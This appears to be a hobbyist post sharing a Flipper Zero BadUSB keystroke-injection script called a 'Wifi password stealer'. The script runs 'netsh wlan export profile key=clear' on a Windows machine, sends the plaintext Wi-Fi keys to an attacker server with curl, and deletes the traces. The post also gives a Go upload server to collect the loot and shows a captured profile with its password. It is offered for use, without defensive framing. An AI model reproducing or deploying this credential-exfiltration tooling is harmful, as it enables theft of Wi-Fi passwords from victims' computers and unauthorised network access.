BadUSB flipper script file :
Because getting on your wifi is just the beginning
----



`REM Wifi password stealer
DELAY 100
GUI r
DELAY 100
STRING cmd
ENTER
DELAY 1000
STRING cd %temp%
ENTER
DELAY 1000
REM exports the wifi passwords as XML
STRING netsh wlan export profile key=clear
ENTER
DELAY 1000
REM put all in 1 file
STRING type *.xml >> flipme.xml
ENTER
DELAY 1000
REM copys the files to host
STRING curl -X POST -F "file=@%temp%/flipme.xml" http://YOURSERVE:PORT/upload ENTER
DELAY 1000
STRING del flipme.xml
ENTER
DELAY 1000
STRING exit
ENTER`
----

Run this fun go uploader that saves the files with timestamp
GoLang because this can be run on any linux box.

package main
import (
 "fmt"
 "io"
 "net/http"
 "os"
 "path/filepath"
 "time"
)
const (
 port = 8080
 uploadPath = "./uploads"
)
func main() {
 if err := os.MkdirAll(uploadPath, os.ModePerm); err != nil {
 fmt.Println("Error creating upload directory:", err)
 return
 }
 http.HandleFunc("/upload", uploadHandler)
 go func() {
 if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
 fmt.Println("Error starting server:", err)
 }
 }()
 fmt.Printf("Server listening on :%d\n", port)
 select {}
}
func uploadHandler(w http.ResponseWriter, r *http.Request) {
 if r.Method != http.MethodPost {
 http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 return
 }
 err := r.ParseMultipartForm(10 << 20) // 10 MB limit
 if err != nil {
 http.Error(w, "Unable to parse form", http.StatusBadRequest)
 return
 }
 file, handler, err := r.FormFile("file")
 if err != nil {
 http.Error(w, "Unable to get file from form", http.StatusBadRequest)
 return
 }
 defer file.Close()
 fileName := fmt.Sprintf("%d_%s", time.Now().UnixNano(), handler.Filename)
 filePath := filepath.Join(uploadPath, fileName)
 out, err := os.Create(filePath)
 if err != nil {
 http.Error(w, "Unable to create file on server", http.StatusInternalServerError)
 return
 }
 defer out.Close()
 _, err = io.Copy(out, file)
 if err != nil {
 http.Error(w, "Error copying file content", http.StatusInternalServerError)
 return
 }
 w.Write([]byte("File uploaded successfully."))
}
----

Connect Flipper on laptop-usb Click and GO! (2 seconds?)
Below saved file of all found wifi passwords with plaintext passwords on my server, so if you see a bald bearded guy around your house.... beware.


flipmeister@server:~/tmp/uploads$ cat 1706822308924902098_flipme.xml
<WLANProfile xmlns="[What's New in Networking | Microsoft Learn](http://www.microsoft.com/networking/WLAN/profile/v1)">
 <name>MyISP</name>
 <SSIDConfig>
 <SSID>
 <hex>5A6967676F4E6F476F</hex>
 <name>MyISP</name>
 </SSID>
 </SSIDConfig>
 <connectionType>ESS</connectionType>
 <connectionMode>auto</connectionMode>
 <MSM>
 <security>
 <authEncryption>
 <authentication>WPA2PSK</authentication>
 <encryption>AES</encryption>
 <useOneX>false</useOneX>
 </authEncryption>
 <sharedKey>
 <keyType>passPhrase</keyType>
 <protected>false</protected>
 <keyMaterial>MyWifiPassword!</keyMaterial>
 </sharedKey>
 </security>
 </MSM>
 <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
 <enableRandomization>false</enableRandomization>
 <randomizationSeed>943798801</randomizationSeed>
 </MacRandomization>
</WLANProfile>






